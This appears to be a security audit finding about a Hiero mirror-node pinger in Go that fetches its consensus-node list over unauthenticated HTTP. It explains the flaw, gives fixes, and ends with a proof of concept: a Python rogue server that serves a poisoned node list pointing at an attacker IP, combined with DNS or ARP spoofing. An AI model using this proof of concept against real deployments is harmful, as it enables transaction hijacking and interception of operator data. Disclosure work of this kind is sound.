### Title
Unauthenticated HTTP Mirror-Node Response Allows Network-Map Poisoning via DNS/MITM

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` fetches the consensus-node list over a plain, unauthenticated HTTP connection with no TLS enforcement, no certificate pinning, and no cryptographic verification of the returned payload. An attacker who can intercept or spoof the HTTP response (DNS poisoning, ARP spoofing, or a compromised network path) can inject a crafted `nodesEnvelope` containing syntactically valid but attacker-controlled `node_account_id` values paired with malicious gRPC endpoints. The resulting network map is passed verbatim to `hiero.ClientForNetwork()`, causing every subsequent transaction to be routed to the attacker's node.

### Finding Description

**Code location:** `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 74–132; consumed at `pinger/sdk_client.go` line 22.

**Root cause – three compounding failures:**

1. **Plain HTTP transport, no TLS.** The HTTP client is constructed with zero TLS configuration: [1](#0-0) 
   The example/default URL in the flag description is `http://mirror-rest:5551` — cleartext. No `tls.Config`, no `VerifyPeerCertificate`, no HTTPS enforcement anywhere in the code.

2. **No response authentication.** After the HTTP response is received, the only processing is JSON decoding and a syntactic `AccountIDFromString()` parse: [2](#0-1) 
   There is no HMAC, no signature, no expected-node-ID allowlist, and no cross-check against a pinned set of known consensus nodes.

3. **Unvalidated endpoint data fed directly to the SDK.** The resulting `network` map — built entirely from attacker-supplied `host:port` and `AccountID` values — is passed without further scrutiny to `hiero.ClientForNetwork()`: [3](#0-2) 

**Exploit flow:**

- **Precondition:** Attacker can intercept or spoof the HTTP response. Realistic vectors: DNS poisoning of the `mirror-rest` hostname (no DNSSEC required), ARP spoofing within the same L2 segment (e.g., shared Kubernetes node), or a rogue pod in the same namespace that hijacks the cluster-DNS record for the mirror REST service. None of these require any credential on the Hashgraph network itself.
- **Trigger:** Attacker serves a crafted `nodesEnvelope`:
  ```json
  {"nodes":[{"node_account_id":"0.0.999",
             "service_endpoints":[{"ip_address_v4":"attacker.ip","port":50211}]}],
   "links":{}}
  ```
  `"0.0.999"` passes `AccountIDFromString()` (syntactically valid shard.realm.num). `host` and `port` are non-empty, so the entry is accepted.
- **Result:** `hiero.ClientForNetwork()` receives `{"attacker.ip:50211": AccountID{0,0,999}}`. Every `TransferTransaction.Execute()` call in `submitWithRetry()` is dispatched to the attacker's gRPC server. [4](#0-3) 

### Impact Explanation

All transactions submitted by the pinger are routed to the attacker-controlled gRPC endpoint. The attacker can: (a) silently drop transactions (liveness DoS — the pinger's health-check purpose is defeated); (b) record transaction content including operator account ID and transfer details before discarding; (c) replay or selectively forward transactions to the real network at a time of the attacker's choosing, corrupting the intended timing semantics. Because the pinger is a liveness/health-check component, sustained routing corruption also masks real network outages from operators.

### Likelihood Explanation

The attack requires network-level interception, not Hashgraph credentials. In Kubernetes deployments (the evident target given the Dockerfile and `/tmp/ready` probe pattern), DNS spoofing within a namespace is achievable by any compromised workload pod — no cluster-admin role needed. The HTTP-only default makes this the common-case deployment. The attack is repeatable: the network map is built once at startup, so a single poisoned response persists for the entire lifetime of the process.

### Recommendation

1. **Enforce HTTPS.** Require `cfg.mirrorRest` to use `https://` and reject `http://` at config-load time. Use a `tls.Config` with `MinVersion: tls.VersionTLS12` in the HTTP client.
2. **Pin or allowlist node account IDs.** Accept an operator-supplied set of expected consensus node account IDs (e.g., `0.0.3`–`0.0.28` for mainnet) and reject any `node_account_id` not in that set.
3. **Validate endpoint addresses.** Reject RFC-1918 / loopback addresses unless explicitly configured for a private network, and enforce a port allowlist (e.g., 50211).
4. **Re-fetch and diff periodically.** If the network map changes between polls, log a warning and require operator acknowledgement before applying the new map.

### Proof of Concept

```bash
# 1. Poison DNS so "mirror-rest" resolves to attacker machine (e.g., via CoreDNS
#    ConfigMap override in the same namespace, or ARP spoofing on the same node).

# 2. On attacker machine, serve the crafted response:
python3 -c "
import http.server, json

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes':[{
            'node_account_id':'0.0.999',
            'service_endpoints':[{'ip_address_v4':'<attacker_ip>','port':50211}]
        }],'links':{}}).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(body)
    def log_message(self,*a): pass

http.server.HTTPServer(('0.0.0.0',5551),H).serve_forever()
"

# 3. Start pinger with network=other pointing at the poisoned hostname:
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
./pinger

# 4. Observe: pinger builds its network map from the attacker response and
#    all gRPC calls go to <attacker_ip>:50211 instead of real consensus nodes.
```

### Citations

**File:** pinger/mirror_node_client.go (L46-46)
```go
	httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
```

**File:** pinger/mirror_node_client.go (L95-110)
```go
	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}

	network := make(map[string]hiero.AccountID)

	for _, n := range payload.Nodes {
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}
```

**File:** pinger/sdk_client.go (L22-22)
```go
		client = hiero.ClientForNetwork(netmap)
```

**File:** pinger/transfer.go (L33-33)
```go
		resp, err := cryptoTransfer.Execute(client)
```
